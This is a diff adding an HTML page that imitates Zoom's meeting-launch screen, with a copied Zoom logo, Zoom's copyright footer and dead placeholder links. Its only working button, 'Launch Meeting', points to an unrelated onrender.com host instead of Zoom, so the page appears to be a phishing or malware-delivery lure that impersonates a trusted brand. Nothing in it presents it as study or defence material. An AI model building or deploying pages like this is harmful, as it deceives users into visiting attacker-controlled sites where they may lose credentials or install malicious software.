@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Launch Zoom Meeting</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fff;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .header {
+            position: absolute;
+            top: 20px;
+            left: 0;
+            width: 100%;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .zoom-logo img {
+            width: 150px;
+        }
+
+        .header-buttons {
+            display: flex;
+            align-items: center;
+        }
+
+        .header-buttons a {
+            font-size: 14px;
+            color: #666;
+            text-decoration: none;
+            margin-left: 20px;
+        }
+
+        .header-buttons a:hover {
+            text-decoration: underline;
+        }
+
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .instructions {
+            margin: 30px 0;
+            font-size: 18px;
+            color: #666;
+        }
+
+        .instructions .highlight {
+            font-weight: bold;
+            color: #000;
+        }
+
+        .launch-btn {
+            margin: 30px 0;
+        }
+
+        .launch-btn a {
+            background-color: #2d8cff;
+            color: white;
+            padding: 12px 30px;
+            text-decoration: none;
+            font-size: 18px;
+            border-radius: 5px;
+            display: inline-block;
+        }
+
+        .launch-btn a:hover {
+            background-color: #0d67b5;
+        }
+
+        .terms {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .terms a {
+            color: #2d8cff;
+            text-decoration: none;
+        }
+
+        .terms a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 80px;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #eaeaea;
+            padding-top: 20px;
+        }
+
+        .footer a {
+            color: #2d8cff;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer p {
+            margin-top: 20px;
+        }
+
+        /* Support Chat Button */
+        .support-chat {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #2d8cff;
+            color: white;
+            padding: 12px;
+            border-radius: 50%;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .support-chat img {
+            width: 20px;
+            height: 20px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Header Section with Zoom Logo, Support, and Language -->
+    <div class="header">
+        <!-- Zoom Logo -->
+        <div class="zoom-logo">
+            <img src="https://i.ibb.co/LPydF3r/zoom-logo.webp" alt="Zoom Logo">
+        </div>
+
+        <!-- Header Buttons: Support and Language -->
+        <div class="header-buttons">
+            <a href="#">Support</a>
+            <a href="#">English</a>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Instructions -->
+        <div class="instructions">
+            Click <span class="highlight">Open Zoom Workplace app</span> on the dialog shown by your browser.<br>
+            If you don’t see a dialog, click <span class="highlight">Launch Meeting</span> below.
+        </div>
+
+        <!-- Launch Button -->
+        <div class="launch-btn">
+            <a href="https://gifter-7vz7.onrender.com">Launch Meeting</a>
+        </div>
+
+        <!-- Terms of Service -->
+        <div class="terms">
+            By joining a meeting, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Statement</a>.
+        </div>
+
+        <!-- Footer Links -->
+        <div class="footer">
+            <a href="#">Don’t have the Zoom Workplace app installed? Download Now</a>
+            <p>©2024 Zoom Video Communications, Inc. All rights reserved.</p>
+            <p>
+                <a href="#">Trust Center</a> | 
+                <a href="#">Acceptable Use Guidelines</a> | 
+                <a href="#">Legal & Compliance</a> | 
+                <a href="#">Do Not Sell My Personal Information</a> | 
+                <a href="#">Cookie Preferences</a>
+            </p>
+        </div>
+    </div>
+
+    <!-- Support Chat Button -->
+    <div class="support-chat">
+        <img src="https://i.ibb.co/FXPcryc/questionmark.webp" alt="Chat Icon">
+    </div>
+
+</body>
+</html>
